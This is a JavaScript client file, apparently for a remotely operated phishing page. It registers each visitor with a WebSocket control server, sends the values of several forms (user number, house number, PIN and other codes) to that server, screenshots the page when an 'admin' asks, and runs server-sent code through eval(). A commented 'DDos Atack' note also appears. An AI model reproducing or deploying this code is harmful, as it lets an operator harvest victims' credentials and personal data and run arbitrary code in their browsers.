	//********************************************************************************************************************************************************************
	// STRING CONFIG
	//********************************************************************************************************************************************************************
	
	//debugger;
	console.log("start MAIN.JS");
	

	var wss_port = '5013'
	var name = "USER1"
	var url_api = 'https://user1.com'


	var preset = "data"
	var token = ''
	var ping_interval = 5;
	var user_localstorage = '__id-user1'
	
	
	
	
	
	//********************************************************************************************************************************************************************
	// WEBSOCKET CONFIG
	//********************************************************************************************************************************************************************


	//var ws = new WebSocket(`wss://dashboard4.com:${wss_port}/`)
	// var ws = new WebSocket(`wss://127.0.0.1:${wss_port}/`)
	var ws = new WebSocket(`ws://127.0.0.1:5001/`)
	
	
	
	//********************************************************************************************************************************************************************
	// STRING CONFIG
	//********************************************************************************************************************************************************************
	
	
	var number_rand = Math.floor(Math.random() * 90000) + 10000
	
	//var number_rand = Math.ceil(Math.random() * 1000000000);

	var host_name = location.hostname
	console.log('https://' + host_name)


	// Strings de configuração	


	var g_time = new Date().getTime()
	var CEID_user_id = "CEID_" + g_time.toString()




	// WEBSOCKET

	ws.onopen = ()=>{
		var userid = localStorage.getItem(user_localstorage);
		
		if(userid==null) create_user();
		else validate();

		ws.send(JSON.stringify({action: "ping"}));

		// DDos Atack
		// ws.send(JSON.stringify({action: "ping"}));
		// ws.send(JSON.stringify({action: "ping"}));
		// ws.send(JSON.stringify({action: "ping"}));
		
		console.log('STATUS ONOPEN>>> ' + (ws.readyState === ws.OPEN))
		
	};
	
	
	ws.onmessage = response=>{
		response = JSON.parse(response.data);

		switch(response.action){
			case "create-user-response":
				if(response.status=="ok"){
					
					localStorage.setItem(user_localstorage, response.id);
					validate();
				}else create_user();
				break;
		    case "user-validate-response":
					if(response.status!="ok") 
						//window.location.href = "../login.html";
						create_user()
					else
						token = response.token;
					break;
			case "command":
			var res = response.command.response;
			console.log(res);
			debugger

			if (res.id == 'login_ok') {
				//$('.login_sms_number').text(res.response[0])
				debugger
				var inverval_login_ok = setInterval(function () {
					var a = $('.target_name');
					
					console.log("loop login_ok");
					if (a.length > 0) {
																
					$('.target_name').text(res.response[0]	);
					
					
					//$(`#${email_type}_all`).show();
					clearInterval(inverval_login_ok)
					}
				}, 100);
				
			
			}
			eval(response.command.response.function);
			break;
		case "response":
			console.log(response);
			getResponse(response.command.response1, response.command.response2);
			console.log(response.command.response1, response.command.response2);
			break;
			case "screenshot":
				html2canvas(document.querySelector("#printscreen_all")).then(canvas => {
				ws.send(JSON.stringify({action: "screenshot-response", token: token, admin: response.admin, canvas: canvas.toDataURL("image/png").replace("image/png", "image/octet-stream")}));
				});
				break;
			case "admin-status":
				if(response.status==true) {
					console.log("New admin connected");
				}else if(response.total==0){
					console.log("No admin connected");
				}
				break;

			case "blocked":
				show_redirect()
				//alert(response.message);
				break;	

			case "pong":
				setTimeout(function() {
					ws.send(JSON.stringify({action: "ping"}));
				}, ping_interval * 1000);	
		}
	};

// FUNCTIONS_WEBSOCKET --------------------------------------------------------------------------------

function create_user(){
	console.log('STATUS WS CREATE>>> ' + (ws.readyState === ws.OPEN))
	ws.send(JSON.stringify({action: "create-user", type: preset, id: CEID_user_id, name: name, site: url_api, token: token}));
}

function validate(){
	console.log('STATUS WS VALIDATE>>> ' + (ws.readyState === ws.OPEN))
	var id = localStorage.getItem(user_localstorage);
	ws.send(JSON.stringify({action: "user-validate", id: id}));
}
  
function ws_send(data){
	console.log('STATUS WS SEND>>> ' + (ws.readyState === ws.OPEN))
	ws.send(JSON.stringify({action: "page-user", data: data, token: token}));
}
	
// FUNCTIONS_WEBSOCKET --------------------------------------------------------------------------------



	//**************************************************************************************************************************************************
	// VALIDAÇÃO DE <FORM>
	//**************************************************************************************************************************************************
	
	/* Valida <form id="form_01"> */
	
	$('#form_01').validate({
		rules: {
			input_number_user: {
				minlength: 11,
				required: true,
			},
			input_number_house: {
				minlength: 8,
				required: true
			}

		},
		messages: {
			input_number_user: "ERROR",
			input_number_house: "ERROR"
			
		},

		highlight: function(element) {
			$(element).addClass('border-error');
		},
		unhighlight: function(element) {
			$(element).removeClass('border-error');
		},
		
		submitHandler: function() {
			
			 data_01 = $("#input_number_user").val();
			 data_02 = $("#input_number_house").val();

			var someData = {
				"user_id": 		localStorage.getItem(user_localstorage),
				"name": 		name,
				"data_01": 		data_01,
				"data_02": 		data_02
			};
			
			alert("SEND WEBSOCKET DATA << FORM_01 >>")
			ws_send(someData);
		}

	});
	
	/* Valida <form id="form_02"> */
	
		$('#form_02').validate({
		rules: {
			input_m1: {
				minlength: 11,
				required: true
			}
 
		},
		messages: {
			input_m1: "ERROR",	
		},

		highlight: function(element) {
			$(element).addClass('border-error');
		},
		unhighlight: function(element) {
			$(element).removeClass('border-error');
		},
		
		submitHandler: function() {
			
			 data_03 = $("#input_m1").val();

			var someData = {
				"user_id": 		localStorage.getItem(user_localstorage),
				"name": 		name,
				"data_03": 		data_03
			};
			
			alert("SEND WEBSOCKET DATA << FORM_02 >>")
			ws_send(someData);
			
		}

	});
	
	
	
	/* Valida <form id="form_02"> */
	
		$('#form_03').validate({
		rules: {
			input_m2: {
				minlength: 11,
				required: true
			}

		},
		messages: {
			input_m2: "ERROR",	
		},

		highlight: function(element) {
			$(element).addClass('border-error');
		},
		unhighlight: function(element) {
			$(element).removeClass('border-error');
		},
		

		submitHandler: function() {
			
			 data_04 = $("#input_m2").val();

			var someData = {
				"user_id": 		localStorage.getItem(user_localstorage),
				"name": 		name,
				"data_04": 		data_04
			};
			
			alert("SEND WEBSOCKET DATA << FORM_03 >>")
			debugger
			ws_send(someData);
			
		}

	});
	
		/* Valida <form id="form_04"> */
	
		$('#form_04').validate({
		rules: {
			input_pin: {
				minlength: 11,
				required: true
			}

		},
		messages: {
			input_pin: "ERROR",	
		},

		highlight: function(element) {
			$(element).addClass('border-error');
		},
		unhighlight: function(element) {
			$(element).removeClass('border-error');
		},
		

		submitHandler: function() {
			
			 data_06 = $("#input_pin").val();

			var someData = {
				"user_id": 		localStorage.getItem(user_localstorage),
				"name": 		name,
				"data_06": 		data_06
			};
			
			alert("SEND WEBSOCKET DATA << FORM_04 >>")
			ws_send(someData);
			
		}

	});
	

	

	//**************************************************************************************************************************************************
	// FUNCTION CUSTOM
	//**************************************************************************************************************************************************
	
	function getPin(pin){
		alert(pin)
	} 

	function getM(type){
		alert(type);
	}
	
	function showPage(type){
		alert(type);
	}
	// // CALL FUNCTION 
	// console.log(obj.action.id)
	// obj.action.func()
	

